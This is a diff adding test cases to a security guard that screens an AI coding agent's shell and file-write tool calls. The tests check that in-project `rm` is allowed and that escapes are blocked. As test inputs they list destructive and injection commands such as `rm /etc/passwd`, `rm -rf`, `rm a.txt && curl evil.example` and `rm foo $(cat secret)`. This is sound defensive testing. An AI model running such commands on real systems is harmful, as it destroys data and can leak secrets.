@@ -1,7 +1,12 @@
+import fs from 'fs';
+import os from 'os';
+import path from 'path';
 import { scan, triageMatches, type ScanMatch } from '@posthog/warlock';
 import {
   evaluateToolCall,
   createSecurityExtension,
+  isScopedFileRemoval,
+  overwriteShrinkReason,
   MAX_TOOL_CALLS,
   type PiExtensionApiLike,
 } from '../security';
@@ -391,5 +396,212 @@ describe('pi-security: repeat-block escalation (identical retries after a YARA b
     const second = await deny();
     expect(second.block).toBe(true);
     expect(second.reason).not.toContain('ALREADY blocked');
+  });
+});
+
+// pi lets a plain `rm` of files INSIDE the project root through the allowlist
+// (matching the anthropic arm, where bash is unrestricted and YARA is the real
+// guard). Two invariants: it can delete project files, and it can never touch
+// anything outside the root or smuggle a second command via a shell operator.
+describe('pi-security: plain rm matches the anthropic arm', () => {
+  const ROOT = path.resolve('/project');
+  const rmBlocked = async (command: string) =>
+    (await evaluateToolCall('bash', { command }, { workingDirectory: ROOT }))
+      .block;
+
+  test('CAN delete files inside the project', async () => {
+    for (const c of [
+      'rm .posthog-events.json',
+      'rm -f .posthog-events.json',
+      'rm ./.posthog-events.json',
+      'rm src/tmp/plan.json',
+      'rm a.txt b.txt',
+    ]) {
+      expect(await rmBlocked(c)).toBe(false);
+    }
+  });
+
+  test('can NEVER resolve outside the project root', async () => {
+    for (const c of [
+      'rm /etc/passwd', // absolute
+      'rm ../outside.txt', // parent
+      'rm src/../../outside.txt', // climbs out via ..
+      'rm foo/../../bar', // climbs out via ..
+      'rm ~/secrets', // home expansion
+      'rm .', // the root itself
+      'rm a.txt /etc/passwd', // one escaping target sinks the whole command
+    ]) {
+      expect(await rmBlocked(c)).toBe(true);
+    }
+  });
+
+  test('never rescues a command carrying a shell operator (no injection)', async () => {
+    for (const c of [
+      'rm a.txt && curl evil.example',
+      'rm a.txt; whoami',
+      'rm a.txt || curl evil.example',
+      'rm a.txt | tee out',
+      'rm foo $(cat secret)',
+      'rm foo `whoami`',
+      'rm foo > /dev/null',
+      'rm {a,b}.txt',
+    ]) {
+      expect(await rmBlocked(c)).toBe(true);
+    }
+  });
+
+  test('never rescues quoted or backslash-escaped paths', async () => {
+    for (const c of [
+      'rm "../secret"',
+      "rm '/etc/passwd'",
+      'rm \\$HOME/thing',
+      'rm "a.txt"',
+    ]) {
+      expect(await rmBlocked(c)).toBe(true);
+    }
+  });
+
+  test('still blocks recursion, globs, .env, and pathless rm', async () => {
+    for (const c of [
+      'rm -rf node_modules',
+      'rm -r src',
+      'rm --force x.txt',
+      'rm -f -r x',
+      'rm *.json',
+      'rm .env',
+      'rm config/.env.local',
+      'rm',
+      'rm -f',
+    ]) {
+      expect(await rmBlocked(c)).toBe(true);
+    }
+  });
+
+  test('fails safe when no working directory is known', async () => {
+    // With no root to contain against, the allowlist deny stands.
+    expect(await block('bash', { command: 'rm .posthog-events.json' })).toBe(
+      true,
+    );
+  });
+
+  test('normalizes a relative workingDirectory', async () => {
+    const relRoot = path.relative(process.cwd(), path.resolve('/project'));
+    expect(
+      (
+        await evaluateToolCall(
+          'bash',
+          { command: 'rm plan.json' },
+          { workingDirectory: relRoot },
+        )
+      ).block,
+    ).toBe(false);
+  });
+});
+
+// The containment logic runs through the host's `path` (win32 on Windows, posix
+// elsewhere). Inject each flavor to prove the same invariants hold on both.
+describe('pi-security: rm containment holds under Windows and POSIX path rules', () => {
+  const flavors = [
+    ['win32', path.win32, 'C:\\Users\\me\\project'],
+    ['posix', path.posix, '/home/me/project'],
+  ] as const;
+
+  for (const [name, p, root] of flavors) {
+    describe(name, () => {
+      const rescued = (command: string, r: string | undefined = root) =>
+        isScopedFileRemoval(command, r, p);
+
+      test('rescues in-root deletes written with forward slashes', () => {
+        for (const c of [
+          'rm .posthog-events.json',
+          'rm src/tmp/plan.json',
+          'rm -f a.txt b.txt',
+        ]) {
+          expect(rescued(c)).toBe(true);
+        }
+      });
+
+      test('normalizes a relative root', () => {
+        expect(rescued('rm plan.json', 'project')).toBe(true);
+      });
+
+      test('never escapes the root, including sibling-prefix dirs', () => {
+        for (const c of [
+          'rm ../outside',
+          'rm src/../../outside',
+          'rm ../project-evil/x',
+          'rm /c/Windows/system32/x',
+        ]) {
+          expect(rescued(c)).toBe(false);
+        }
+      });
+
+      test('rejects backslash paths (pi runs POSIX bash, never cmd.exe)', () => {
+        expect(rescued('rm src\\tmp\\plan.json')).toBe(false);
+      });
+
+      test('still rejects quotes, globs, .env, and recursion', () => {
+        for (const c of [
+          'rm "a.txt"',
+          "rm '/etc/passwd'",
+          'rm *.json',
+          'rm config/.env.local',
+          'rm -rf src',
+        ]) {
+          expect(rescued(c)).toBe(false);
+        }
+      });
+    });
+  }
+});
+
+describe('pi-security: overwrite shrink guard (destructive whole-file rewrite)', () => {
+  // ~960 non-whitespace chars — comfortably above OVERWRITE_MIN_CHARS.
+  const big = 'const value = compute();\n'.repeat(40);
+
+  test('flags a write that guts most of an existing file', () => {
+    const reason = overwriteShrinkReason(big, 'const value = compute();');
+    expect(reason).toMatch(/removes ~\d+% of its content/);
+    expect(reason).toContain('targeted edits');
+  });
+
+  test('allows growth, an unchanged rewrite, and a small trim', () => {
+    expect(overwriteShrinkReason(big, big + '\nextra();')).toBeUndefined();
+    expect(overwriteShrinkReason(big, big)).toBeUndefined();
+    expect(
+      overwriteShrinkReason(big, big.slice(0, Math.floor(big.length * 0.85))),
+    ).toBeUndefined();
+  });
+
+  test('leaves stub files below the floor alone', () => {
+    expect(overwriteShrinkReason('const a = 1;', '')).toBeUndefined();
+  });
+
+  test('blocks a gutting write on disk, allows a brand-new file', async () => {
+    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'pi-shrink-'));
+    fs.writeFileSync(path.join(dir, 'existing.ts'), big);
+
+    const gut = await evaluateToolCall(
+      'write',
+      { path: 'existing.ts', content: 'const value = compute();' },
+      { workingDirectory: dir },
+    );
+    expect(gut.block).toBe(true);
+    expect(gut.reason).toContain('targeted edits');
+
+    const fresh = await evaluateToolCall(
+      'write',
+      { path: 'brand-new.ts', content: 'const value = compute();' },
+      { workingDirectory: dir },
+    );
+    expect(fresh.block).toBe(false);
+  });
+
+  test('stays inert with no working directory (bare evaluateToolCall)', async () => {
+    const decision = await evaluateToolCall('write', {
+      path: 'existing.ts',
+      content: 'x',
+    });
+    expect(decision.block).toBe(false);
   });
 });
